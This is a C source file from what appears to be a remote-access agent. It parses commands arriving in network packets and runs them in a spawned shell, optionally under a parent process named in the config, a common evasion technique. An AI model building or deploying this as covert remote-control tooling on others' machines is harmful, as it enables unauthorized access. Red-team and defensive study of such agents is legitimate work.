#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <direct.h>
#include <process.h>
#include <io.h>
#include <fcntl.h>
#include "cJSON.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_shell.h"
#include "agent_commands.h"

command_result* cmd_shell_terminate(session* sess, packet* pck) {
	DECLARE_RESULT(error);
	if (shell_free(sess->shell)) {
		sess->shell = ZERO(command_shell);
		SET_RESULT_SUCCESS(error);
	}	
	return error;
}

command_result* cmd_shell_run_command(session* sess, packet* pck) {
	DECLARE_RESULT(error);
	char* jcommand = ZERO(char);
	cJSON* cmd_info = ZERO(cJSON);
	program_run_info* info = ZERO(program_run_info);

	// clone string
	jcommand = MEM_ALLOC(pck->data_size + 1);
	if (!jcommand) goto fail;
	memcpy(jcommand, pck->data, pck->data_size);

	// get details
	cmd_info = cJSON_Parse(jcommand);
	if (!cmd_info) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	FREE(jcommand);
	jcommand = ZERO(char);

	cJSON* command = cJSON_GetObjectItem(cmd_info, "cmd");
	if (!command) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
		
	sess->quit_shell = false;
	if (!sess->shell) {
		// read the shell command to use from config
		cJSON* jsession = cJSON_GetObjectItem(sess->config, CONFIG_SESSION);
		if (!jsession) {
			error->error_code = ERROR_JSON_CONVERSION;
			goto fail;
		}
		cJSON* jshell = cJSON_GetObjectItem(jsession, CONFIG_SESSION_SHELL);
		if (!jshell) {
			error->error_code = ERROR_JSON_CONVERSION;
			goto fail;
		}

		// read the parent process to use if any
		cJSON* jexec = cJSON_GetObjectItem(jsession, CONFIG_SESSION_EXEC);
		if (!jexec) {
			error->error_code = ERROR_JSON_CONVERSION;
			goto fail;
		}
		char* parent_program = ZERO(char);
		cJSON* jProcessParent = cJSON_GetObjectItemCaseSensitive(jexec, CONFIG_SESSION_PROCESSPARENT);
		if (jProcessParent)
			parent_program = jProcessParent->valuestring;

		// create a new shell
		sess->shell = OBJ_ALLOC(command_shell);
		if (!sess->shell) goto fail;
		sess->shell->proc = OBJ_ALLOC(process_handle);
		if (!sess->shell->proc) goto fail;

		info = OBJ_ALLOC(program_run_info);
		if (!info) goto fail;
		info->sess = sess;
		info->pck = message_clone_packet(pck);
		info->process_intercepted = OBJ_ALLOC(process_intercepted);
		if (!info->process_intercepted) goto fail;
		info->process_intercepted->process = sess->shell->proc;
		error->error_code = shell_new(jshell->valuestring, parent_program, info, sess->shell);
	}

	// send command to input thread
	if (!sess->shell) goto fail;
	*((uint32_t*)sess->shell->data) = pck->id;
	if (!shell_run(sess->shell, command->valuestring)) goto fail;

	cJSON_Delete(cmd_info);
	SET_RESULT_SUCCESS(error);
	return error;

fail:
	sess->quit_shell = true;
	FREE(jcommand);
	if (cmd_info) cJSON_Delete(cmd_info);
	return error;
}